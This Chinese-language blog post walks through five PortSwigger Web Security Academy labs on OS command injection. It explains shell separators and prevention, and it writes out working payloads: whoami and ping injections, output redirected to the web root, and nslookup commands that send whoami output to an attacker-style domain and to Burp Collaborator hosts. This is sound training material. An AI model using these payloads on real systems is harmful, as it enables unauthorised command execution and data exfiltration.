# 原创
：  【burpsuite安全练兵场-服务端4】操作系统命令注入-5个实验（全）

# 【burpsuite安全练兵场-服务端4】操作系统命令注入-5个实验（全）

   <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点： 
（1）掌握基本命令（√）
（2）掌握BP提供的服务器（√）
（3）掌握拼拼接命令（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|服务端专项|所需基础知识|学习目标|状态
|[【0X01】SQL注入-17个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128434815?spm=1001.2014.3001.5501)|1、数据库基本语法| 1、掌握SQL注入方法 2、掌握不同注入的区别 3、掌握注入的意义，即可以发现的信息 |已发布
|[【0X02】身份认证漏洞-16个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128454196?spm=1001.2014.3001.5501)| 1、基本信收集 2、爆破工具的使用（如BP） 3、需要一点的逻辑分析能力 | 1、掌握身份验证的方法 2、掌握对数据包差别的细微分析 3、掌握身份认证的基本逻辑 |已发布
|[【0X03】目录遍历漏洞-6个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128487462?spm=1001.2014.3001.5501)|1、对于路径的敏感度| 1、掌握路径模糊查询（爆破） 2、掌握基本的绕过方法 |已发布
|[【0X04】操作系统命令注入-5个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128495612?spm=1001.2014.3001.5501)| 1、基本操作系统命令（可慢慢接触后学） 2、带外的平台（可慢慢发现） 3、带外的服务器（实验可使用BP提供的） | 1、掌握基本命令 2、掌握BP提供的服务器 3、掌握拼拼接命令 |已发布
|[【0X05】业务逻辑漏洞-11个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128509488?spm=1001.2014.3001.5501)| 1、需要会基本的BP使用能力（后期可不断提高）  2、基础的数据包分析能力（可不断提升） | 1、掌握如何分析业务逻辑 2、掌握业务逻辑的可能缺陷 3、掌握业务逻辑的第三方功能 |已发布
|[【0X06】信息泄露漏洞-5个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128544645?spm=1001.2014.3001.5501)| 1、需要会一些发现的工具（后期可不断使用新工具） 2、需要会一点Linux基本工具命令 | 1、掌握BP信息收集的工具的使用方法 2、掌握常见的信息泄露及其获取方法 |已发布
|【0X07】访问控制|即将发布，敬请期待|——|——
|【0X08】文件上传|即将发布，敬请期待|——|——
|【0X09】服务端请求伪造SSRF|即将发布，敬请期待|——|——
|【0X10】XEE注射|即将发布，敬请期待|——|——
</tbody></table>


---


**目录**

[一、操作系统命令注入](#%E4%B8%80%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)

[1、意义](#1%E3%80%81%E6%84%8F%E4%B9%89)

[2、有用的命令](#2%E3%80%81%E6%9C%89%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4)

[3、注入操作系统命令的方式](#3%E3%80%81%E6%B3%A8%E5%85%A5%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E7%9A%84%E6%96%B9%E5%BC%8F)

[4、防止操作系统命令注入攻击](#4%E3%80%81%E9%98%B2%E6%AD%A2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB)

[二、执行任意命令](#%E4%BA%8C%E3%80%81%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4)

[1、示例：](#1%E3%80%81%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E7%AE%80%E5%8D%95%EF%BC%89)[实验1：操作系统命令注入（简单）](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E7%AE%80%E5%8D%95%EF%BC%89)

[三、盲操作系统命令注入漏洞](#%E4%B8%89%E3%80%81%E7%9B%B2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)

[1、简述](#1%E3%80%81%E7%AE%80%E8%BF%B0)

[2、示例](#2%E3%80%81%E7%A4%BA%E4%BE%8B)

[3、使用时间延迟检测盲OS命令注入](#3%E3%80%81%E4%BD%BF%E7%94%A8%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E6%A3%80%E6%B5%8B%E7%9B%B2OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)

[        ](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%85%B7%E6%9C%89%E6%97%B6%E5%BB%B6%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8%E5%85%A5)[实验2：具有时延的操作系统命令盲注入](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%85%B7%E6%9C%89%E6%97%B6%E5%BB%B6%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8%E5%85%A5)

[4、通过重定向输出利用盲目操作系统命令注入](#4%E3%80%81%E9%80%9A%E8%BF%87%E9%87%8D%E5%AE%9A%E5%90%91%E8%BE%93%E5%87%BA%E5%88%A9%E7%94%A8%E7%9B%B2%E7%9B%AE%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)

[        ](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%B8%A6%E6%9C%89%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91%E7%9A%84%E7%9B%B2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)[实验3：带有输出重定向的盲操作系统命令注入](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%B8%A6%E6%9C%89%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91%E7%9A%84%E7%9B%B2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)

[5、利用带外（OAST）技术](#5%E3%80%81%E5%88%A9%E7%94%A8%E5%B8%A6%E5%A4%96%EF%BC%88OAST%EF%BC%89%E6%8A%80%E6%9C%AF)

[        ](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E5%85%B7%E6%9C%89%E5%B8%A6%E5%A4%96%E4%BA%A4%E4%BA%92%E7%9A%84%E7%9B%B2OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)[实验4：具有带外交互的盲OS命令注入](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E5%85%B7%E6%9C%89%E5%B8%A6%E5%A4%96%E4%BA%A4%E4%BA%92%E7%9A%84%E7%9B%B2OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)

[        ](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%85%B7%E6%9C%89%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE%E6%B3%84%E6%BC%8F%E7%9A%84%E7%9B%B2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)[实验5：具有带外数据泄漏的盲操作系统命令注入](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%85%B7%E6%9C%89%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE%E6%B3%84%E6%BC%8F%E7%9A%84%E7%9B%B2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)

---


> 
<h2> <img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>助你一臂之力</h2>
<h3>📋问题1：需要准备些什么？</h3>
🎯掌握基础的命令，尝试各种拼接（前期的信息收集）
🎯带外工具（dnslog），自己的服务器


## 一、操作系统命令注入

> 
<h3>1、意义</h3>
1、简述：操作系统命令注入（也称为外壳注入）是一个Web安全漏洞，允许攻击者在运行应用程序的服务器上执行任意操作系统（OS）命令
2、危害：通常会完全危害应用程序及其所有数据，攻击者可以利用操作系统命令注入漏洞来危害托管基础架构的其他部分，利用信任关系将攻击转向组织内的其他系统。<br/>  
<hr/>
<h3>2、有用的命令</h3>
<pre><code>识别操作系统命令注入漏洞后，执行一些初始命令以获取有关已受损系统的信息
一些在Linux和Windows平台上有用的命令的摘要： 

命令的目的 	   Linux操作系统   Windows
当前用户的名称   whoami 	       whoami
操作系统 	   uname -a 	   ver
网络配置 	   ifconfig 	   ipconfig /all
网络连接 	   netstat -an 	   netstat -an
运行进程 	   ps -ef 	       tasklist </code></pre>
<hr/>
<h3>3、注入操作系统命令的方式</h3>
1、简述：
各种外壳元字符可用于执行操作系统命令注入攻击，许多字符用作命令分隔符，允许将命令链接在一起
<pre><code>1、以下命令分隔符在基于Windows和基于Unix的系统上都有效：
    &amp;
    &amp;&amp;
    |
    ||

2、以下命令分隔符仅适用于基于Unix的系统：
    ;
    换行符（0x0a或\n）

3、在基于Unix的系统上，您还可以使用反勾号或美元字符在原始命令中执行插入命令的内联执行：

    '
    注入命令'
    $（插入命令）</code></pre>
————
2、分析观察
不同的shell元字符具有细微不同的行为，这些行为可能会影响它们在某些情况下是否有效，以及它们是否允许带内检索命令输出，还是只对盲目利用有用
有时，控制的输入出现在原始命令的引号内。在这种情况下，在使用合适的shell元字符插入新命令之前，需要终止加引号的上下文（使用"或'）
<hr/>
<h3>4、防止操作系统命令注入攻击</h3>
防止操作系统命令注入漏洞的最有效方法是永远不要从应用层代码调用操作系统命令（在每种情况下，都有使用更安全的平台API实现所需功能的替代方法）
<pre><code>如果使用用户提供的输入调用OS命令是不可避免的，则必须执行强输入验证：
    1、根据允许值的白名单进行验证。
    2、验证输入是否为数字。
    3、验证输入是否仅包含字母数字字符，而不包含其他语法或空白。
    4、不要试图通过转义shell元字符来清理输入（非常容易出错，且容易被熟练的攻击者绕过）</code></pre>



### 2、有用的命令

---


### 4、防止操作系统命令注入攻击

---


---


## 二、执行任意命令

> 
<h3>1、示例：</h3>
<pre><code>1、一个购物应用程序：

允许用户查看某个商品在特定商店中是否有库存

可通过以下URL：
https://insecure-website.com/stockStatus?productID=381&amp;storeID=29</code></pre>
<br/>  
<pre><code>2、需查询其他系统：

提供股票信息，应用程序必须查询各种遗留系统。该功能是通过调用shell命令并将产品和商店ID作为参数来实现，如
stockreport.pl 381 29（此命令输出指定项目的库存状态，并返回给用户）

------
攻击者：
如果应用程序未实现针对操作系统命令注入的防御措施，攻击者可以提交以下输入来执行任意命令：
&amp; echo aiwefwlguh &amp;

如果此输入在产品ID参数，则应用程序执行的命令为：
stockreport.pl &amp; echo aiwefwlguh &amp; 29


将附加命令分隔符&amp;放置在插入的命令之后，结合echo命令输出回显，这是测试某些类型的操作系统命令注入的有用方法，降低了阻止执行注入命令的可能性（&amp;字符是shell命令分隔符，因此执行的是三个独立的命令）

返回给用户的输出为：
Error - productID was not provided    （stockreport.pl执行时未使用预期参数，返回错误提示）
aiwefwlguh                （执行注入的echo命令，并输出）
29: command not found     （参数29作为命令执行，导致错误）</code></pre>
<hr/>
涉及实验：<br/> 实验1：操作系统命令注入（简单）


> 
<h3>实验1：操作系统命令注入（简单）</h3>
part1：
使用Burp Suite拦截和修改检查库存水平的请求

<hr/>
part2：
发送到repeater
修改storeID参数（带入一个命令）
<pre>`1|whoami`</pre>



<hr/>
part3:
修改数据包，并关闭拦截




---


---


---


## 三、盲操作系统命令注入漏洞

> 
<h3>1、简述</h3>
许多操作系统命令注入实例都是隐蔽漏洞。这意味着应用程序不会在其HTTP响应中返回命令的输出。盲漏洞仍然可以被利用，但需要不同的技术
<hr/>
<h3>2、示例</h3>
一个网站允许用户提交有关该网站的反馈。用户输入他们的电子邮件地址和反馈信息，服务器端应用程序向站点管理员生成包含反馈的电子邮件
————
它将调用邮件程序，其中包含提交的详细信息，如：
<pre>`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`</pre>
————
mail命令的输出（如果有的话）不会在应用程序的响应中返回，因此使用echo有效负载不会有效。在这种情况下，可以使用各种其他技术来检测和利用漏洞<br/>  
<hr/>
<h3>3、使用时间延迟检测盲OS命令注入</h3>
1、可以使用将触发时间延迟的注入命令，从而根据应用程序响应所需的时间来确认命令是否已执行
————
2、ping命令是一种有效的方法，因为它允许您指定要发送的ICMP数据包的数量，从而指定命令运行所需的时间：
<pre>`&amp; ping -c 10 127.0.0.1 &amp;`</pre>
此命令将使应用程序ping其环回网络适配器10秒。
————
涉及实验：<br/> 实验2：具有时延的操作系统命令盲注入



### 2、示例

---


> 
<h3>实验2：具有时延的操作系统命令盲注入</h3>
part1：
填写反馈信息
使用Burp Suite拦截和修改提交反馈的请求


<hr/>
part2：
发送到repeater
修改email参数
<pre>`email=x||ping+-c+10+127.0.0.1||`</pre>
观察响应，时间基本上为10s，存在系统命令注入


<hr/>
part3：
修改数据包，并关闭拦截

等10s后刷新一下页面，就完成了




---


---


> 
<h3>4、通过重定向输出利用盲目操作系统命令注入</h3>
1、可以将注入命令的输出重定向到Web根目录中的文件中，然后可以使用浏览器检索该文件。例如，如果应用程序从文件系统位置/var/www/static提供静态资源，则可以提交以下输入：
<pre><code>&amp; whoami &gt; /var/www/static/whoami.txt &amp;
（学过Linux的应该都会这些命令）</code></pre>
2、解释：&gt;字符发送来自whoami命令添加到指定文件（这里是输出到whoami.txt，没有就自动创建）。然后可以使用浏览器获取https://vulnerable-website.com/whoami.txt以检索文件，并查看插入命令的输出。 
<hr/>
涉及实验：<br/> 实验3：带有输出重定向的盲操作系统命令注入


> 
<h3>实验3：带有输出重定向的盲操作系统命令注入</h3>
part1：
填写反馈信息
使用Burp Suite拦截和修改提交反馈的请求


<hr/>
part2：
发送到repeater
修改email参数
<pre>`email=||whoami&gt;/var/www/images/output.txt||`</pre>

 在数据包中修改，并关闭拦截



<hr/>
part3：
通过filename参数文件包含，读取输出到output.txt文件的信息
<pre>`filename=output.txt`</pre>


第三个数据包（老演员了）

 发送到repeater

 在数据包中修改，并关闭拦截




---


> 
<h3>5、利用带外（OAST）技术</h3>
1、简述：
可以使用一个注入命令，该命令将触发与您使用OAST技术控制的系统的带外网络交互。例如：
<pre>`&amp; nslookup kgji2ohoyw.web-attacker.com &amp;`</pre>
此有效负载使用nslookup命令对指定的域进行DNS查找。攻击者可以监视指定查找的发生，从而检测到命令已成功插入。 
<hr/>
2、带外通道还提供了一种从注入命令中提取输出的简单方法：
<pre>`&amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;`</pre>
这将导致对攻击者的域进行DNS查找，该域包含whoami命令：
<pre>`wwwuser.kgji2ohoyw.web-attacker.com`</pre>
<hr/>
2、涉及实验：<br/> 实验4：具有带外交互的盲OS命令注入
实验5：具有带外数据泄漏的盲操作系统命令注入


---


---


> 
<h3>实验4：具有带外交互的盲OS命令注入</h3>
part1：
填写反馈信息
使用Burp Suite拦截和修改提交反馈的请求


<hr/>
 part2：
打开BP的Collaborator客户端

复制服务器URL（这个是我的BP的提供的服务器）
4injhpna543tc1766dwv1466ux0noc.burpcollaborator.net
 <img alt="" height="842" src="https://img-blog.csdnimg.cn/d6c91bf15b3741f887621742792b13c6.png" width="906"/>

<hr/>
part3：
发送到repeater
修改email参数，将其更改为：
<pre><code>email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
我的是：
email=x||nslookup+4injhpna543tc1766dwv1466ux0noc.burpcollaborator.net||
</code></pre>


 <img alt="" height="842" src="https://img-blog.csdnimg.cn/e0f22ea77f074a11b9bfb9e765de5bdb.png" width="906"/>

<hr/>
part4：
修改数据包，并关闭拦截








---


> 
<h3>实验5：具有带外数据泄漏的盲操作系统命令注入</h3>
part1：
填写反馈信息
使用Burp Suite拦截和修改提交反馈的请求


<hr/>
 part2：
打开BP的Collaborator客户端



复制服务器URL（这个是我的BP的提供的服务器）
fl45n2ug5x4nmill7s67s7u7jypodd.burpcollaborator.net
 <img alt="" height="842" src="https://img-blog.csdnimg.cn/3da5d9d997a744da8a4693c8cbbe91fe.png" width="906"/>


<hr/>
part3：
发送到repeater
修改email参数，将其更改为：
<pre><code>email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
我的是：
email=x||nslookup+`whoami`.fl45n2ug5x4nmill7s67s7u7jypodd.burpcollaborator.net||
</code></pre>



 <img alt="" height="842" src="https://img-blog.csdnimg.cn/613c6d2f27a1463cbab6e3819a30ac67.png" width="906"/>


<hr/>
part4：
修改数据包，并关闭拦截



 <img alt="" height="842" src="https://img-blog.csdnimg.cn/bc96a9a5f1b749b3bce7b6bc7d886cb2.png" width="906"/>



<hr/>
part5：

完成实验
我的用户**peter-WKvUPX**




 <img alt="" height="824" src="https://img-blog.csdnimg.cn/7a9d5210e3524ca882aa9399a0bd0a56.png" width="1200"/>

 <img alt="" height="608" src="https://img-blog.csdnimg.cn/2e4bc22d6f9843fb8ea48104d99862c6.png" width="1200"/>



---


---


---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[看雪渗透测试服务](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

